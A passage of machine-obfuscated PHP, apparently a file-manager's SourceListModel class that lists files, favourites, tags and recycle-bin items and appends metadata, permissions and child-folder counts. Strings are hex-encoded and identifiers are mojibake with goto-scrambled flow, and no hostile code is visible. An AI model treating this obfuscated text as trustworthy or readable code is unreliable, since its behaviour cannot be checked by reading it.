~3; goto A§­ß¡¯‹©; bõöàÑË¤ù: } } goto FÔ¦¦…ÈÆÆ; aç½ÃÑ¹‡: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\x65" => "\x69\157\137\x73\x6f\x75\x72\143\x65\137\155\x65\x74\141", "\x6d\x65\x74\141\x46\x69\145\x6c\x64" => "\x73\157\x75\162\x63\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\124\151\155\145", "\164\x69\155\x65", "\151\156\163\x65\162\x74", "\146\165\x6e\143\164\151\157\x6e"), array("\x63\x72\145\141\164\145\124\151\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\x73\145\162\x74", "\146\x75\156\x63\164\x69\x6f\156"), array("\166\x69\x65\x77\124\151\155\x65", "\164\151\155\x65", "\151\156\x73\145\x72\x74", "\146\165\156\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($BîÊÕáã«) { return $this->listSource(array($_SERVER[÷ÖêïÔÔÓ][365] => $BîÊÕáã«)); } public function typeName($d¿áÃ‚óß) { static $Bä˜ììŠÙ¦ = array(self::TYPE_SYSTEM => "\163\x79\x73\164\x65\155", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\162\157\x75\x70"); return $Bä˜ììŠÙ¦[$d¿áÃ‚óß . $_SERVER[÷ÖêïÔÔÓ][33]]; } public function sourceListInfo($D¼Í‡ÜÍ‡, $bêµá÷ÄÇÙ = false) { $aèŸÜçƒ£ =& $_SERVER[÷ÖêïÔÔÓ]; $D¼Í‡ÜÍ‡ = array_filter(array_unique($D¼Í‡ÜÍ‡)); if (!$D¼Í‡ÜÍ‡) { return array(); } $BÏŒØÑŸ›… = $this->where(array($aèŸÜçƒ£[366] => array($aèŸÜçƒ£[7], $D¼Í‡ÜÍ‡)))->select(); $this->_listDataApply($BÏŒØÑŸ›…, $bêµá÷ÄÇÙ); return array_to_keyvalue($BÏŒØÑŸ›…, $aèŸÜçƒ£[366]); } public function pathInfoFilter($fÆ†á¯£‹§) { goto a–‰ÅÑŒ‹; a–‰ÅÑŒ‹: $aÂÏê£å» =& $_SERVER[÷ÖêïÔÔÓ]; $fÆ†á¯£‹§[$aÂÏê£å»[76]] = KodIO::make($fÆ†á¯£‹§[$aÂÏê£å»[366]]); $fÆ†á¯£‹§[$aÂÏê£å»[29]] = $fÆ†á¯£‹§[$aÂÏê£å»[367]] == 1 ? $aÂÏê£å»[77] : $aÂÏê£å»[164]; goto eáËµõ—ï»; E…ëÜ°ºğÉ: $eë¨¶‚´¶ì .= $aÂÏê£å»[371]; $eë¨¶‚´¶ì .= $aÂÏê£å»[372]; $d¦¶÷¶÷ù = explode($aÂÏê£å»[47], $eë¨¶‚´¶ì); goto bª¤¼²©ô; eáËµõ—ï»: $fÆ†á¯£‹§[$aÂÏê£å»[368]] = $this->typeName($fÆ†á¯£‹§[$aÂÏê£å»[368]]); if ($fÆ†á¯£‹§[$aÂÏê£å»[367]] != 1) { $fÆ†á¯£‹§[$aÂÏê£å»[157]] = $fÆ†á¯£‹§[$aÂÏê£å»[369]]; unset($fÆ†á¯£‹§[$aÂÏê£å»[369]]); } $eë¨¶‚´¶ì = $aÂÏê£å»[370]; goto E…ëÜ°ºğÉ; bª¤¼²©ô: if (isset($fÆ†á¯£‹§[$aÂÏê£å»[373]]) && $fÆ†á¯£‹§[$aÂÏê£å»[373]][$aÂÏê£å»[374]] == -1) { $d¦¶÷¶÷ù = array_remove_value($d¦¶÷¶÷ù, $aÂÏê£å»[184]); $d¦¶÷¶÷ù = array_remove_value($d¦¶÷¶÷ù, $aÂÏê£å»[106]); $d¦¶÷¶÷ù = array_remove_value($d¦¶÷¶÷ù, $aÂÏê£å»[375]); $d¦¶÷¶÷ù = array_remove_value($d¦¶÷¶÷ù, $aÂÏê£å»[376]); $d¦¶÷¶÷ù = array_remove_value($d¦¶÷¶÷ù, $aÂÏê£å»[78]); $d¦¶÷¶÷ù = array_remove_value($d¦¶÷¶÷ù, $aÂÏê£å»[377]); } $fÆ†á¯£‹§ = array_field_key($fÆ†á¯£‹§, $d¦¶÷¶÷ù); return $fÆ†á¯£‹§; goto AŠøÔßäˆ×; AŠøÔßäˆ×: } public function listUserFav() { goto Aê‘ã„Ùƒ„; Dó¡ÄÓ¿¨ã: $BŞ©Ä®„áå = array_to_keyvalue($BŞ©Ä®„áå, $aÜê·ÍíŒÚ[33], $aÜê·ÍíŒÚ[76]); if ($BŞ©Ä®„áå) { $d“Ÿ‰ÙÕ¯• = $this->listSource(array($aÜê·ÍíŒÚ[380] => array($aÜê·ÍíŒÚ[381], $BŞ©Ä®„áå))); } $d“Ÿ‰ÙÕ¯• = array_to_keyvalue($d“Ÿ‰ÙÕ¯•[$aÜê·ÍíŒÚ[350]], $aÜê·ÍíŒÚ[366]); goto AäË‘À•í‰; AäË‘À•í‰: foreach ($c‚§¼ øÃ as &$B…¼§Õª¹ª) { $B…¼§Õª¹ª = array($aÜê·ÍíŒÚ[382] => $B…¼§Õª¹ª[$aÜê·ÍíŒÚ[364]], $aÜê·ÍíŒÚ[383] => $B…¼§Õª¹ª[$aÜê·ÍíŒÚ[28]], $aÜê·ÍíŒÚ[384] => $B…¼§Õª¹ª[$aÜê·ÍíŒÚ[76]], $aÜê·ÍíŒÚ[385] => $B…¼§Õª¹ª[$aÜê·ÍíŒÚ[29]], $aÜê·ÍíŒÚ[386] => $B…¼§Õª¹ª[$aÜê·ÍíŒÚ[184]], $aÜê·ÍíŒÚ[387] => $B…¼§Õª¹ª[$aÜê·ÍíŒÚ[106]]); if ($B…¼§Õª¹ª[$aÜê·ÍíŒÚ[29]] == $aÜê·ÍíŒÚ[379] && $d“Ÿ‰ÙÕ¯•[$B…¼§Õª¹ª[$aÜê·ÍíŒÚ[76]]]) { $B…¼§Õª¹ª[$aÜê·ÍíŒÚ[388]] = $d“Ÿ‰ÙÕ¯•[$B…¼§Õª¹ª[$aÜê·ÍíŒÚ[76]]]; } } return $c‚§¼ øÃ; goto fÅÙ‰í³Š; Aê‘ã„Ùƒ„: $aÜê·ÍíŒÚ =& $_SERVER[÷ÖêïÔÔÓ]; $c‚§¼ øÃ = Model($aÜê·ÍíŒÚ[378])->listData(); $BŞ©Ä®„áå = array_filter_by_field($c‚§¼ øÃ, $aÜê·ÍíŒÚ[29], $aÜê·ÍíŒÚ[379]); goto Dó¡ÄÓ¿¨ã; fÅÙ‰í³Š: } public function listUserTag($b²ÒàŸÜùĞ) { goto E…ª·ñÒ; Fêõ½µÎÛŠ: $dœí  àš’ = array_to_keyvalue($dœí  àš’, $E¬ø÷ïÃŒ[33], $E¬ø÷ïÃŒ[76]); if (!$dœí  àš’) { return array(); } $AÓ²êê„÷¢ = array($E¬ø÷ïÃŒ[380] => array($E¬ø÷ïÃŒ[381], $dœí  àš’)); goto cƒ£é®“„ƒ; E…ª·ñÒ: $E¬ø÷ïÃŒ =& $_SERVER[÷ÖêïÔÔÓ]; $Dì™éƒ¼ = Model($E¬ø÷ïÃŒ[389])->listData(); $dœí  àš’ = array_filter_by_field($Dì™éƒ¼, $E¬ø÷ïÃŒ[390], $b²ÒàŸÜùĞ); goto Fêõ½µÎÛŠ; cƒ£é®“„ƒ: return $this->listSource($AÓ²êê„÷¢); goto Cí¢Å‰é; Cí¢Å‰é: } public function listUserRecycle() { $EÛäÖÁÍ¿è =& $_SERVER[÷ÖêïÔÔÓ]; $Cˆ¡°™’ = Model($EÛäÖÁÍ¿è[391])->listData(); if (!$Cˆ¡°™’) { return array(); } $fİ˜ì½ë°ï = array($EÛäÖÁÍ¿è[380] => array($EÛäÖÁÍ¿è[381], $Cˆ¡°™’), $EÛäÖÁÍ¿è[392] => 1); return $this->listSource($fİ˜ì½ë°ï); } public function listSource($bèµÎ‚ùßà, $D‡ã‡±º¯ = 3000) { goto dß³Ş¹óè; dß³Ş¹óè: $EÙÖ ô«“ =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset($bèµÎ‚ùßà[$EÙÖ ô«“[393]])) { $bèµÎ‚ùßà[$EÙÖ ô«“[393]] = 0; } $Fß°¦İö– = $EÙÖ ô«“[394]; goto cîö¡î—Üƒ; d¿³Ã÷Õ¬æ: return $b¾îñ£‚‰; goto c“™Ãºƒ¼­; cîö¡î—Üƒ: $b¾îñ£‚‰ = $this->field($Fß°¦İö–)->_makeOrder()->where($bèµÎ‚ùßà)->selectPage($D‡ã‡±º¯); $this->_listDataApply($b¾îñ£‚‰[$EÙÖ ô«“[350]]); $this->_listMake($b¾îñ£‚‰); goto d¿³Ã÷Õ¬æ; c“™Ãºƒ¼­: } protected function _makeOrder() { goto E¼İÜİğ˜¯; c¿§ŒÖõœî: if ($f©ĞÊÏÆ× == $FÅ©‹¹»Ë[28]) { } $bçÒÊŒ›ÉÆ = $FÅ©‹¹»Ë[405] . $aÊˆ•¿˜ñ[$f©ĞÊÏÆ×] . $FÅ©‹¹»Ë[50] . $aĞìÜä»èà[$eÊÏ«‰â¨Õ]; return $this->order(rtrim(trim($bçÒÊŒ›ÉÆ), $FÅ©‹¹»Ë[47])); goto C’¯õ¥ÚÌ©; D¢ĞŞÙÍİö: $eÊÏ«‰â¨Õ = Input::get($FÅ©‹¹»Ë[404], $FÅ©‹¹»Ë[7], $c¶Îó’ëŒÉ, array_keys($aĞìÜä»èà)); if (!in_array($f©ĞÊÏÆ×, array_keys($aÊˆ•¿˜ñ))) { $f©ĞÊÏÆ× = $FÅ©‹¹»Ë[28]; } if (!in_array($eÊÏ«‰â¨Õ, array_keys($aĞìÜä»èà))) { $f©ĞÊÏÆ× = $FÅ©‹¹»Ë[398]; } goto c¿§ŒÖõœî; E¼İÜİğ˜¯: $FÅ©‹¹»Ë =& $_SERVER[÷ÖêïÔÔÓ]; $eîÕáÑˆœ = Model($FÅ©‹¹»Ë[395])->get($FÅ©‹¹»Ë[396]); $c¶Îó’ëŒÉ = Model($FÅ©‹¹»Ë[395])->get($FÅ©‹¹»Ë[397]); goto FÃÒÒíŒÈ; FÃÒÒíŒÈ: $aĞìÜä»èà = array($FÅ©‹¹»Ë[398] => $FÅ©‹¹»Ë[399], $FÅ©‹¹»Ë[400] => $FÅ©‹¹»Ë[401]); $aÊˆ•¿˜ñ = array($FÅ©‹¹»Ë[28] => $FÅ©‹¹»Ë[28], $FÅ©‹¹»Ë[78] => $FÅ©‹¹»Ë[78], $FÅ©‹¹»Ë[157] => $FÅ©‹¹»Ë[369], $FÅ©‹¹»Ë[375] => $FÅ©‹¹»Ë[375], $FÅ©‹¹»Ë[402] => $FÅ©‹¹»Ë[376], $FÅ©‹¹»Ë[184] => $FÅ©‹¹»Ë[184], $FÅ©‹¹»Ë[106] => $FÅ©‹¹»Ë[106]); $f©ĞÊÏÆ× = Input::get($FÅ©‹¹»Ë[403], $FÅ©‹¹»Ë[7], $eîÕáÑˆœ, array_keys($aÊˆ•¿˜ñ)); goto D¢ĞŞÙÍİö; C’¯õ¥ÚÌ©: } protected function _listDataApplyItem($f•Ó†», $D¥Œ°¦Â¿ø = false) { $b‰¦…–§  = array($f•Ó†»); $this->_listDataApply($b‰¦…–§ , $D¥Œ°¦Â¿ø); return $b‰¦…–§ [0]; } protected function _listDataApply(&$cÇ‹£¬Úº®, $eÅÌ´ˆ¡ğ = false) { goto bóÒ»Ÿøò©; F¤¯õ‰“ìô: $this->_listAppendAuth($cÇ‹£¬Úº®); $this->_listAppendSourceInfo($cÇ‹£¬Úº®, $bäÁŠß’®á); $this->_listAppendUser($cÇ‹£¬Úº®); goto F±”ƒ¥îœ½; aÒ¯ÊÓËô: $bäÁŠß’®á = array_unique($bäÁŠß’®á); $this->_listSourceCache($cÇ‹£¬Úº®); if (!$eÅÌ´ˆ¡ğ) { $this->_listAppendMeta($cÇ‹£¬Úº®, $bäÁŠß’®á); $this->_listAppendFileMeta($cÇ‹£¬Úº®, $bäÁŠß’®á); $this->_listAppendChildren($cÇ‹£¬Úº®, $bäÁŠß’®á); $this->_listAppendPath($cÇ‹£¬Úº®); } goto F¤¯õ‰“ìô; F±”ƒ¥îœ½: $this->_listFilterInfo($cÇ‹£¬Úº®, $eÅÌ´ˆ¡ğ); goto aŠšÍ‰ò; bóÒ»Ÿøò©: $bÒ‰ç®éß¡ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$cÇ‹£¬Úº®) { $cÇ‹£¬Úº® = array(); return; } $bäÁŠß’®á = array_to_keyvalue($cÇ‹£¬Úº®, $bÒ‰ç®éß¡[33], $bÒ‰ç®éß¡[366]); goto aÒ¯ÊÓËô; aŠšÍ‰ò: } protected function _listSourceCache($FÁÚ¾¢š) { $Dàì¬ÄÆ˜™ =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($FÁÚ¾¢š as $Fâˆî¤©’ç) { self::$cacheSourceInfo[$Dàì¬ÄÆ˜™[406] . $Fâˆî¤©’ç[$Dàì¬ÄÆ˜™[366]]] = $Fâˆî¤©’ç; } } protected function _listFilterInfo(&$eÉ›‹Ÿ†èĞ, $C–î‚ÃêŸ¶ = false) { $dÕ£ºñÉ =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($eÉ›‹Ÿ†èĞ as &$E¹äÛ³Æ˜™) { $E¹äÛ³Æ˜™ = $this->pathInfoFilter($E¹äÛ³Æ˜™); self::$cachePathInfo[$dÕ£ºñÉ[407] . intval($C–î‚ÃêŸ¶) . $dÕ£ºñÉ[408] . $E¹äÛ³Æ˜™[$dÕ£ºñÉ[366]]] = $E¹äÛ³Æ˜™; } } protected function _listMake(&$E¥áàè¯æö) { $C‰”¾¶‹œŒ =& $_SERVER[÷ÖêïÔÔÓ]; $E¥áàè¯æö[$C‰”¾¶‹œŒ[75]] = array(); $E¥áàè¯æö[$C‰”¾¶‹œŒ[74]] = array(); foreach ($E¥áàè¯æö[$C‰”¾¶‹œŒ[350]] as $Cç¬¢”ÍØ) { $C„Ú’Ğ±±Ê = $Cç¬¢”ÍØ[$C‰”¾¶‹œŒ[367]] == 1 ? $C‰”¾¶‹œŒ[75] : $C‰”¾¶‹œŒ[74]; $E¥áàè¯æö[$C„Ú’Ğ±±Ê][] = $Cç¬¢”ÍØ; } unset($E¥áàè¯æö[$C‰”¾¶‹œŒ[350]]); } protected function _listAppendMeta(&$eóôÛƒ®ŞË, $eÅËÌ¨ªÉ) { goto eÂù¦•ÃÃä; eÂù¦•ÃÃä: $bÓŠùòï =& $_SERVER[÷ÖêïÔÔÓ]; $CŞ®î…‚å× = array($bÓŠùòï[380] => array($bÓŠùòï[381], $eÅËÌ¨ªÉ)); $d´–Ê“ä¼Ä = Model($bÓŠùòï[409])->field($bÓŠùòï[410])->where($CŞ®î…‚å×)->select(); goto EßæÏÅ¹¢§; Cğ…¨†í‰ó: foreach ($d´–Ê“ä¼Ä as $c³¿›Šˆ) { if (!isset($f˜î„ïÆğ[$c³¿›Šˆ[$bÓŠùòï[366]]])) { $f˜î„ïÆğ[$c³¿›Šˆ[$bÓŠùòï[366]]] = array(); } if (in_array($c³¿›Šˆ[$bÓŠùòï[88]], $DøÄÑ™Ï¤“)) { continue; } $f˜î„ïÆğ[$c³¿›Šˆ[$bÓŠùòï[366]]][$c³¿›Šˆ[$bÓŠùòï[88]]] = $c³¿›Šˆ[$bÓŠùòï[354]]; } foreach ($eóôÛƒ®ŞË as &$DàÖ¦‡‡î†) { $DàÖ¦‡‡î†[$bÓŠùòï[413]] = !1; if (isset($f˜î„ïÆğ[$DàÖ¦‡‡î†[$bÓŠùòï[366]]])) { $DàÖ¦‡‡î†[$bÓŠùòï[413]] = $f˜î„ïÆğ[$DàÖ¦‡‡î†[$bÓŠùòï[366]]]; } if ($this->fileIsLock($DàÖ¦‡‡î†) && $DàÖ¦‡‡î†[$bÓŠùòï[373]]) { $CÚö×‰ÙÌ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $DàÖ¦‡‡î†[$bÓŠùòï[373]][$bÓŠùòï[374]] = AuthModel::authDisable($DàÖ¦‡‡î†[$bÓŠùòï[373]][$bÓŠùòï[374]], $CÚö×‰ÙÌ); $DàÖ¦‡‡î†[$bÓŠùòï[373]][$bÓŠùòï[414]][$bÓŠùòï[373]] = $DàÖ¦‡‡î†[$bÓŠùòï[373]][$bÓŠùòï[374]]; } } goto d±ôÖÉç°˜; EßæÏÅ¹¢§: if (!$d´–Ê“ä¼Ä) { return; } $DøÄÑ™Ï¤“ = array($bÓŠùòï[411], $bÓŠùòï[412]); $f˜î„ïÆğ = array(); goto Cğ…¨†í‰ó; d±ôÖÉç°˜: } protected function _listAppendFileMeta(&$DÇ˜Á‰¥´Š, $cÛÎ›¹™Óµ) { goto BŠÆ£šÂËÆ; BŠÆ£šÂËÆ: $A›œŸÍğ¼ô =& $_SERVER[÷ÖêïÔÔÓ]; $f´Óà¾‰‡ = array_to_keyvalue($DÇ˜Á‰¥´Š, $A›œŸÍğ¼ô[33], $A›œŸÍğ¼ô[415]); $f´Óà¾‰‡ = array_filter(array_unique($f´Óà¾‰‡)); goto b¦ßÜÎÕ©…; cµóÌ‘”ŸŸ: $BÈÂ‡ÆÊáÀ = $BÈÂ‡ÆÊáÀ ? $BÈÂ‡ÆÊáÀ : array(); $B¯ˆµÆ¦¨ = array(); foreach ($BÈÂ‡ÆÊáÀ as $F‘ª¹ƒÆí„) { if (!isset($B¯ˆµÆ¦¨[$F‘ª¹ƒÆí„[$A›œŸÍğ¼ô[415]]])) { $B¯ˆµÆ¦¨[$F‘ª¹ƒÆí„[$A›œŸÍğ¼ô[415]]] = array(); } $B¯ˆµÆ¦¨[$F‘ª¹ƒÆí„[$A›œŸÍğ¼ô[415]]][$F‘ª¹ƒÆí„[$A›œŸÍğ¼ô[88]]] = $F‘ª¹ƒÆí„[$A›œŸÍğ¼ô[354]]; } goto aŒ½ÃóªøŠ; aŒ½ÃóªøŠ: foreach ($DÇ˜Á‰¥´Š as &$Cï—’á²Çç) { goto B²½¸¡™Ë»; B²½¸¡™Ë»: $CÎàÏÙ¿‘¹ = $Cï—’á²Çç[$A›œŸÍğ¼ô[415]]; if (!$CÎàÏÙ¿‘¹ || !isset($c¼ÏÛˆá½¯[$CÎàÏÙ¿‘¹])) { continue; } $cˆãÜíí¡ = $c¼ÏÛˆá½¯[$CÎàÏÙ¿‘¹]; goto eÆÏãàà‰ë; fˆĞ£ìˆ©: unset($c¼ÏÛˆá½¯[$CÎàÏÙ¿‘¹][$A›œŸÍğ¼ô[76]]); $fÜ‰‹òÌàª = is_array($B¯ˆµÆ¦¨[$CÎàÏÙ¿‘¹]) ? $B¯ˆµÆ¦¨[$CÎàÏÙ¿‘¹] : array(); $Cï—’á²Çç[$A›œŸÍğ¼ô[159]] = array_merge($fÜ‰‹òÌàª, $c¼ÏÛˆá½¯[$CÎàÏÙ¿‘¹]); goto e‰Â¸Æ·¨Ë; e‰Â¸Æ·¨Ë: if (isset($Cï—’á²Çç[$A›œŸÍğ¼ô[159]][$A›œŸÍğ¼ô[422]])) { $Cï—’á²Çç[$A›œŸÍğ¼ô[422]] = json_decode($Cï—’á²Çç[$A›œŸÍğ¼ô[159]][$A›œŸÍğ¼ô[422]], !0); unset($Cï—’á²Çç[$A›œŸÍğ¼ô[159]][$A›œŸÍğ¼ô[422]]); } goto cÊäÂÔ¶ÖÂ; eÆÏãàà‰ë: $cˆãÜíí¡[$A›œŸÍğ¼ô[78]] = $Cï—’á²Çç[$A›œŸÍğ¼ô[78]]; $cˆãÜíí¡[$A›œŸÍğ¼ô[28]] = $Cï—’á²Çç[$A›œŸÍğ¼ô[28]]; self::$cacheFileInfo[$A›œŸÍğ¼ô[421] . $CÎàÏÙ¿‘¹] = $cˆãÜíí¡; goto fˆĞ£ìˆ©; cÊäÂÔ¶ÖÂ: } goto DÏá¹çËê; b¦ßÜÎÕ©…: if (!$f´Óà¾‰‡) { return; } $A°”øÄ©òô = array($A›œŸÍğ¼ô[416] => array($A›œŸÍğ¼ô[381], $f´Óà¾‰‡)); $F ¡¾èÓ´ = $A›œŸÍğ¼ô[417]; goto cÈ‰Ğ—·¾; cÈ‰Ğ—·¾: $c¼ÏÛˆá½¯ = Model($A›œŸÍğ¼ô[418])->field($F ¡¾èÓ´)->where($A°”øÄ©òô)->select(); $c¼ÏÛˆá½¯ = array_to_keyvalue($c¼ÏÛˆá½¯, $A›œŸÍğ¼ô[415]); $BÈÂ‡ÆÊáÀ = Model($A›œŸÍğ¼ô[419])->field($A›œŸÍğ¼ô[420])->where($A°”øÄ©òô)->select(); goto cµóÌ‘”ŸŸ; DÏá¹çËê: } protected function _listAppendSourceInfo(&$aòšŠ—õ œ, $d–”Æğ×æ…) { goto b‹Äˆ©¡ƒ¾; C‰Ê©¥¹¶¥: $E˜ãŞÎœ¶ = array_to_keyvalue_group($d—õÖâ‚©ó, $C—½¥†Å‡¹[366]); foreach ($aòšŠ—õ œ as &$eÃÚïªë¨¯) { $eÃÚïªë¨¯[$C—½¥†Å‡¹[388]] = array($C—½¥†Å‡¹[426] => 0, $C—½¥†Å‡¹[427] => 0, $C—½¥†Å‡¹[428] => 0); if (isset($bõùÛ¼»Á¬[$eÃÚïªë¨¯[$C—½¥†Å‡¹[366]]])) { $eÃÚïªë¨¯[$C—½¥†Å‡¹[388]][$C—½¥†Å‡¹[429]] = 1; $eÃÚïªë¨¯[$C—½¥†Å‡¹[388]][$C—½¥†Å‡¹[430]] = $bõùÛ¼»Á¬[$eÃÚïªë¨¯[$C—½¥†Å‡¹[366]]][$C—½¥†Å‡¹[28]]; } if (isset($c­¤ö™¾Ò—[$eÃÚïªë¨¯[$C—½¥†Å‡¹[366]]])) { $eÃÚïªë¨¯[$C—½¥†Å‡¹[388]][$C—½¥†Å‡¹[431]] = array(); foreach ($c­¤ö™¾Ò—[$eÃÚïªë¨¯[$C—½¥†Å‡¹[366]]] as $EùˆŒ£»ÙŠ) { $eáŸˆâÏêÀ = $bÃ‚ƒİ”Æ“[$EùˆŒ£»ÙŠ]; $eÃÚïªë¨¯[$C—½¥†Å‡¹[388]][$C—½¥†Å‡¹[431]][] = array($C—½¥†Å‡¹[432] => $eáŸˆâÏêÀ[$C—½¥†Å‡¹[364]], $C—½¥†Å‡¹[383] => $eáŸˆâÏêÀ[$C—½¥†Å‡¹[28]], $C—½¥†Å‡¹[433] => $eáŸˆâÏêÀ[$C—½¥†Å‡¹[434]]); } } if (isset($E˜ãŞÎœ¶[$eÃÚïªë¨¯[$C—½¥†Å‡¹[366]]])) { $eÃÚïªë¨¯[$C—½¥†Å‡¹[388]][$C—½¥†Å‡¹[435]] = array(); foreach ($E˜ãŞÎœ¶[$eÃÚïªë¨¯[$C—½¥†Å‡¹[366]]] as $e±ç‚ğ‡ ) { $eÃÚïªë¨¯[$C—½¥†Å‡¹[388]][$C—½¥†Å‡¹[435]] = array($C—½¥†Å‡¹[436] => $e±ç‚ğ‡ [$C—½¥†Å‡¹[437]], $C—½¥†Å‡¹[438] => $e±ç‚ğ‡ [$C—½¥†Å‡¹[439]], $C—½¥†Å‡¹[440] => $e±ç‚ğ‡ [$C—½¥†Å‡¹[366]], $C—½¥†Å‡¹[441] => $e±ç‚ğ‡ [$C—½¥†Å‡¹[442]], $C—½¥†Å‡¹[443] => $e±ç‚ğ‡ [$C—½¥†Å‡¹[444]]); } } } return $aòšŠ—õ œ; goto E’½ÚÎí‚Ì; b‹Äˆ©¡ƒ¾: $C—½¥†Å‡¹ =& $_SERVER[÷ÖêïÔÔÓ]; if (!defined($C—½¥†Å‡¹[423])) { return; } $AÄ’öâ·‘ = Model($C—½¥†Å‡¹[424])->listData(); goto Eœ¬ÈêÙõ¶; Eœ¬ÈêÙõ¶: $fÙÑ‚ÒÏƒï = Model($C—½¥†Å‡¹[389])->listData(); $f‡öå²´î¯ = Model($C—½¥†Å‡¹[378])->listData(); $d—õÖâ‚©ó = Model($C—½¥†Å‡¹[425])->listSimple(); goto Fâ¡öì‡‡î; Fâ¡öì‡‡î: $bÃ‚ƒİ”Æ“ = array_to_keyvalue($AÄ’öâ·‘, $C—½¥†Å‡¹[364]); $c­¤ö™¾Ò— = array_to_keyvalue_group($fÙÑ‚ÒÏƒï, $C—½¥†Å‡¹[76], $C—½¥†Å‡¹[390]); $bõùÛ¼»Á¬ = array_to_keyvalue($f‡öå²´î¯, $C—½¥†Å‡¹[76]); goto C‰Ê©¥¹¶¥; E’½ÚÎí‚Ì: } protected function _listAppendChildren(&$B¤Ù™ÂçÓã, $Eˆ¼åãÜ´») { goto fëî¦Ùñ°; a«–ãƒµÊò: $d÷áŸ¡²§Å = 1024 * 50; $a—«“­ÄŸ = count($B¤Ù™ÂçÓã); $A£¾ô£ÃÇ• = $this->tablePrefix . $this->tableName; goto fßäÀõ•ÆÎ; fßäÀõ•ÆÎ: for ($b‹²Ì‡×íÔ = 0; $b‹²Ì‡×íÔ < $a—«“­ÄŸ; $b‹²Ì‡×íÔ++) { if ($B¤Ù™ÂçÓã[$b‹²Ì‡×íÔ][$D”¦Ì»µ­À[367]]) { $Eø»ŒÅ÷Â = $B¤Ù™ÂçÓã[$b‹²Ì‡×íÔ][$D”¦Ì»µ­À[366]]; $dÔá¿–µ .= "\123\105\x4c\105\x43\x54\x20\x2a\40\x46\x52\117\x4d\x20\x28\x53\x45\114\x45\x43\124\40\47{$Eø»ŒÅ÷Â}\137\150\x61\163\106\151\x6c\145\x27\x20\x61\x73\40\150\141\163\54\143\x6f\165\x6e\x74\x28\x31\x29\40\x61\x73\40\x68\141\163\103\157\x75\156\164\40\106\x52\117\x4d\40\140{$A£¾ô£ÃÇ•}\x60\x20\12\x9\11\11\x9\x9\x77\x68\145\x72\145\x20\160\141\x72\x65\x6e\x74\x49\104\75{$Eø»ŒÅ÷Â}\40\141\156\144\x20\x69\163\x46\157\154\x64\x65\x72\x3d\60\x20\x61\x6e\144\x20\x69\x73\104\x65\154\x65\x74\x65\75\x30\x29\40\x61\163\x20\164\x62\x31\x5f{$Eø»ŒÅ÷Â}\40\x75\x6e\x69\x6f\x6e\40\x61\x6c\x6c\x20\12\x9\x9\x9\x9\x9\123\105\x4c\105\103\124\40\52\40\106\122\117\115\40\50\x53\105\114\x45\103\124\40\x27{$Eø»ŒÅ÷Â}\137\150\x61\163\106\x6f\154\144\x65\162\x27\40\141\163\40\x68\x61\163\x46\151\x6c\x65\x2c\x63\157\x75\x6e\164\50\61\x29\40\x61\x73\40\150\141\x73\x43\157\x75\x6e\x74\x20\106\122\117\x4d\40\x60{$A£¾ô£ÃÇ•}\x60\x20\xa\x9\11\x9\11\x9\x77\150\145\162\145\x20\160\141\x72\x65\156\164\x49\104\75{$Eø»ŒÅ÷Â}\40\x61\156\x64\x20\x69\x73\106\157\154\x64\x65\x72\x3d\61\40\141\x6e\x64\40\151\163\104\x65\x6c\145\x74\x65\x3d\60\x29\x20\x61\x73\x20\164\142\62\x5f{$Eø»ŒÅ÷Â}\x20\x75\x6e\151\x6f\x6e\40\x61\154\154\40"; } if ((strlen($dÔá¿–µ) >= $d÷áŸ¡²§Å || $b‹²Ì‡×íÔ == $a—«“­ÄŸ - 1) && $dÔá¿–µ) { $dÔá¿–µ = substr($dÔá¿–µ, 0, -strlen($D”¦Ì»µ­À[445])); $a×¶ªø‰‰» = $this->query($dÔá¿–µ); $eò¢Ê“œ» = array_merge($eò¢Ê“œ», $a×¶ªø‰‰»); $dÔá¿–µ = $D”¦Ì»µ­À[33]; } } $eò¢Ê“œ» = array_to_keyvalue($eò¢Ê“œ», $D”¦Ì»µ­À[446]); foreach ($B¤Ù™ÂçÓã as &$eì‹ù–‹ã) { if ($eì‹ù–‹ã[$D”¦Ì»µ­À[367]]) { unset($eì‹ù–‹ã[$D”¦Ì»µ­À[369]]); $eì‹ù–‹ã[$D”¦Ì»µ­À[189]] = intval($eò¢Ê“œ»[$eì‹ù–‹ã[$D”¦Ì»µ­À[366]] . $D”¦Ì»µ­À[447]][$D”¦Ì»µ­À[448]]); $eì‹ù–‹ã[$D”¦Ì»µ­À[188]] = intval($eò¢Ê“œ»[$eì‹ù–‹ã[$D”¦Ì»µ­À[366]] . $D”¦Ì»µ­À[449]][$D”¦Ì»µ­À[448]]); } } goto A ©Ø‰—î÷; fëî¦Ùñ°: $D”¦Ì»µ­À =& $_SERVER[÷ÖêïÔÔÓ]; $dÔá¿–µ = $D”¦Ì»µ­À[358]; $eò¢Ê“œ» = array(); goto a«–ãƒµÊò; A ©Ø‰—î÷: } protected function _listAppendAuth(&$BÑ°‘¦äõÎ) { goto d•†Äù‚‡Š; C’§•Ø«¤»: foreach ($BÑ°‘¦äõÎ as $E§¼Å÷ÁƒŠ) { if ($E§¼Å÷ÁƒŠ[$FÜĞì¾•™[368]] == self::TYPE_GROUP) { $c¬Öæè÷ŠÖ[] = $E§¼Å÷ÁƒŠ[$FÜĞì¾•™[366]]; } } if (!$c¬Öæè÷ŠÖ) { return; } $eœñ÷·¦í = array_to_keyvalue($BÑ°‘¦äõÎ, $FÜĞì¾•™[366]); goto dß¼çœ‚¿; dß¼çœ‚¿: $cùÎ‡ÖêÀ = Model($FÜĞì¾•™[450])->getSourceList($c¬Öæè÷ŠÖ, $eœñ÷·¦í); foreach ($BÑ°‘¦äõÎ as $b´°·ÉÂ¬ => &$E§¼Å÷ÁƒŠ) { $E§¼Å÷ÁƒŠ[$FÜĞì¾•™[373]] = $cùÎ‡ÖêÀ[$E§¼Å÷ÁƒŠ[$FÜĞì¾•™[366]]]; if 